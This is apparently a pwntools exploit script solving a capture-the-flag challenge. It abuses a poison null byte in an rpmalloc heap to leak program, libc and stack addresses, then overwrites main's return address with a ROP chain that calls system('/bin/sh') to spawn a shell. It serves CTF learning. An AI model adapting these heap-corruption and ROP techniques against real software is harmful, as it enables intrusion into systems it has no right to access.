#!/usr/bin/env python3

from pwn import *
import time

context.log_level = 'error'
context.binary = elf = ELF('./chall')
libc = elf.libc

# replace with your own terminal for debugging
context.terminal = ['alacritty', '-e']

# feel free to replace this gdb script with your own
gs = """
b *main+290
continue
"""

if args.REMOTE:
    io = remote("ctf-registration.chal.wwctf.com", 1337)
else:
    io = gdb.debug(elf.path, gdbscript=gs) if args.GDB else process()

# Now the actual "exploit" functions

def register_hacker(age: bytes, name: bytes, desc: bytes):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'? ', age)
    io.sendlineafter(b'? ', name)
    io.sendlineafter(b'? ', desc)

def read_hacker(index: int):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'? ', str(index).encode())

def add_credits_to_heap():
    io.sendlineafter(b'>> ', b'69')

def close_program():
    io.sendlineafter(b'>> ', b'3')

def exploit():
    context.log_level = 'info'

    # we have a poison null byte bug in this chall !
    # let's abuse it using rpmalloc implementation :D

    # Step 1 : Get a leak using scanf misuse
    add_credits_to_heap() # useful for leaking program address
    register_hacker(b'1', b'hacker1', b'foobar')
    register_hacker(b'+', b'hacker2', b'foobar')
    read_hacker(1)

    io.recvuntil(b'Age: ')
    rpmalloc_leak = int(io.recvline()) 
    program_ptr = rpmalloc_leak - 0x10060

    info("rpmalloc leak : " + hex(rpmalloc_leak))
    info("program address ptr : " + hex(program_ptr))
    

    # Step 2 : Create overlapping chunks
    # now at this point, the next chunk that we will allocate
    # will be close enough to overwrite the heap->local_free[size]->fd
    # LSB so that we get overlapping chunks :)
    register_hacker(b'3', b'hacker3', b'A'*16 + pack(program_ptr - 0x8) + b'A'*8)

    # rpmalloc will pop the fd from our chunk during allocation to put
    # it as the head of it's local free list, thus giving us control
    # over our allocator's addresses !

    # we'll use this bug to read the program space address stored
    # by the secret option.

    register_hacker(b'4', b'hacker4', b'foobar')
    register_hacker(b'5', b'hacker5', b'foobar')
    register_hacker(b'+', b'', b'') # preserve memory using scanf

    read_hacker(5)
    io.recvuntil(b'Name: ')
    elf.address = unpack(io.recvline()[:-1].ljust(8, b'\x00')) - 0x8020
    info("program base : " + hex(elf.address))

    # Now that we rotated our heap into another heap class, our
    # "hacker" heap thinks it's empty from popping 8 null bytes from 
    # program_ptr's fd... This means rpmalloc will allocate a new
    # bunch of initialized blocks for us 0x1000 bytes after the start
    # of our initial heap ! We can now repeat our exploit :)
    # Details : https://github.com/mjansson/rpmalloc/blob/develop/rpmalloc/rpmalloc.c#L1136

    # Step 3 : Get a libc leak from the stdout ptr in program space

    info("stdout@GLIBC ptr : " + hex(elf.sym.stdout))

    for _ in range(9): # chunks for padding
        register_hacker(b'69', b'foo', b'bar')

    # Same method as before to create overlapping chunks
    register_hacker(b'69', b'idk', b'A'*32) # null byte poisoning
    register_hacker(b'96', b'idk', pack(elf.sym.stdout - 0x8)) # we add padding to avoid crashes with non 0 pointers landing in fd.
    register_hacker(b'0', b'doesnt', b'matter')

    register_hacker(b'+', b'', b'')
    read_hacker(18) 

    io.recvuntil(b'Name: ')
    libc.address = unpack(io.recvline()[:-1].ljust(8, b'\x00')) - 0x21b780
    info("libc base : " + hex(libc.address))
    info("libc environ : " + hex(libc.sym.environ))

    # Step 4 : Repeat our overlapping chunk method in order to leak
    # a stack pointer from libc's environ global.

    for _ in range(10): # chunks for padding
        register_hacker(b'69', b'foo', b'bar')
    
    register_hacker(b'69', b'idk', b'A'*16 + pack(libc.sym.environ - 0x8) + b'A'*8)
    register_hacker(b'0', b'doesnt', b'matter')
    register_hacker(b'0', b'doesnt', b'matter')

    register_hacker(b'+', b'', b'')
    read_hacker(32)

    io.recvuntil(b'Name: ')
    stack_leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
    main_ret = stack_leak - 0x120
    info("stack leak : " + hex(stack_leak))
    info("main ret ptr : " + hex(main_ret))

    # Step 5 : Rotate our heap onto the stack in order to write a rop
    # chain by overwriting the main function's return address

    for _ in range(4): # chunks for padding
        register_hacker(b'69', b'foo', b'bar')

    register_hacker(b'0', b'boo', b'A'*16 + pack(main_ret - 0x10) + b'A'*8)
    register_hacker(b'69', b'foo', b'A'*32)
    register_hacker(b'69', b'foo', b'A'*32)

    rop = ROP(libc)
    pop_rdi = rop.rdi.address
    ret = rop.ret.address
    binsh = next(libc.search(b'/bin/sh\x00'))
    payload = flat(
        pop_rdi, binsh,
        ret,
        libc.sym.system
    )

    register_hacker(b'+', b'', payload)

    # Step 6 : Return from main and trigger our rop chain !
    close_program()
    io.interactive()

    
if __name__ == "__main__":
    exploit()